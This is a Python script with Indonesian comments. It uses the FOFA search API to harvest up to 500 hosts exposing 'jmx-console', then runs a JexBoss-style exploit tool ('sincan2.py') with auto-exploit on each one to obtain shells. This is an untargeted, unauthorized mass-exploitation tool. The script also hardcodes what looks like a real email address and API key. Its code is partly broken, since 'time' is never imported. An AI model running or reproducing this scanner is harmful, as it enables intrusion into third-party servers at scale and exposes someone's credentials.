#!/usr/bin/env python
import requests
import base64
import subprocess
import sys
import os

# --- KONFIGURASI FOFA ---
# Ganti dengan email Anda yang terdaftar di FOFA
FOFA_EMAIL = "moniranayuriani@gmail.com" 
# API Key FOFA Anda (SANGAT DISARANKAN MENGGUNAKAN ENVIRONMENT VARIABLE)
FOFA_KEY = "0892538df2334ace7ebae687e7823ce9" 

# Dork yang akan digunakan
DORK = "jmx-console"

# Jumlah hasil yang ingin diambil dari FOFA (maks 10,000)
RESULT_SIZE = 500 

def fofa_search(query, email, key, size=100):
    """
    Mencari target di FOFA menggunakan API.
    """
    print(f"[*] Mencari target di FOFA dengan dork: '{query}'...")
    try:
        # Query harus di-encode ke Base64 untuk API FOFA
        query_b64 = base64.b64encode(query.encode('utf-8')).decode('utf-8')
        
        # Endpoint yang benar untuk search adalah /search/all, bukan /host/
        api_url = f"https://fofa.info/api/v1/search/all?email={email}&key={key}&qbase64={query_b64}&size={size}&fields=host"
        
        response = requests.get(api_url, timeout=30)
        response.raise_for_status()  # Akan memunculkan error jika status code bukan 2xx
        
        data = response.json()
        
        if data.get("error"):
            print(f"[!] Error dari FOFA API: {data.get('errmsg', 'Unknown error')}")
            return []
            
        # FOFA mengembalikan hasil dalam bentuk list di dalam list
        hosts = [item[0] for item in data.get("results", [])]
        return hosts
        
    except requests.exceptions.RequestException as e:
        print(f"[!] Error koneksi saat menghubungi FOFA API: {e}")
        return []
    except Exception as e:
        print(f"[!] Terjadi error tak terduga: {e}")
        return []

def run_jexboss(target_url):
    """
    Menjalankan sincan2.py pada satu target.
    """
    print("="*60)
    print(f"💥 Memulai pemindaian JexBoss pada: {target_url}")
    print("="*60)
    
    try:
        # Perintah yang akan dieksekusi
        command = [
            sys.executable,  # Menggunakan interpreter python yang sama dengan skrip ini
            "sincan2.py", 
            "-u", 
            target_url,
            "-M",             # Menjalankan scan modern
            "--auto-exploit"  # Menjalankan auto-exploit dan membuka shell jika berhasil
        ]
        
        # Menjalankan JexBoss dan membiarkan outputnya tampil di terminal
        subprocess.run(command)
        
    except FileNotFoundError:
        print("[!!] FATAL ERROR: File 'sincan2.py' tidak ditemukan.")
        print("[!!] Pastikan 'fofa_jexboss_scanner.py' berada di direktori yang sama dengan 'sincan2.py'.")
        return False # Mengembalikan False untuk menghentikan loop
    except Exception as e:
        print(f"[!] Gagal menjalankan JexBoss pada {target_url}: {e}")
    
    return True # Lanjut ke target berikutnya

def main():
    """Fungsi Orkestrasi Utama"""
    # Ganti email di atas dengan email FOFA Anda
    if FOFA_EMAIL == "email@example.com":
        print("[!] PENTING: Harap edit skrip ini dan masukkan alamat email FOFA Anda pada variabel FOFA_EMAIL.")
        return

    targets = fofa_search(DORK, FOFA_EMAIL, FOFA_KEY, size=RESULT_SIZE)
    
    if not targets:
        print("[+] Tidak ada target ditemukan dari FOFA. Program selesai.")
        return
        
    print(f"\n[+] Ditemukan {len(targets)} target potensial dari FOFA:")
    for i, target in enumerate(targets, 1):
        print(f"  [{i}] {target}")
        
    print("\n----------------------------------------------------")
    
    try:
        confirm = input(f"[*] Apakah Anda ingin melanjutkan pemindaian {len(targets)} target dengan JexBoss? (y/n): ").lower()
    except KeyboardInterrupt:
        print("\n[+] Pilihan dibatalkan oleh pengguna. Program berhenti.")
        return
        
    if confirm != 'y':
        print("[+] Program dihentikan oleh pengguna.")
        return
        
    print("\n🚀 Memulai pemindaian massal...\n")
    for target in targets:
        # Memastikan target memiliki skema http/https
        if "://" not in target:
            # Kita asumsikan http karena jmx-console sering di port non-standar
            target_url = "http://" + target
        else:
            target_url = target
            
        if not run_jexboss(target_url):
            # Jika run_jexboss mengembalikan False (misal file tidak ditemukan), hentikan semua
            break
        
        print("\n--- Jeda 5 detik sebelum lanjut ke target berikutnya ---\n")
        time.sleep(5) # Jeda agar tidak terlalu membebani jaringan/API

    print("\n✅ Pemindaian massal selesai.")

if __name__ == "__main__":
    main()
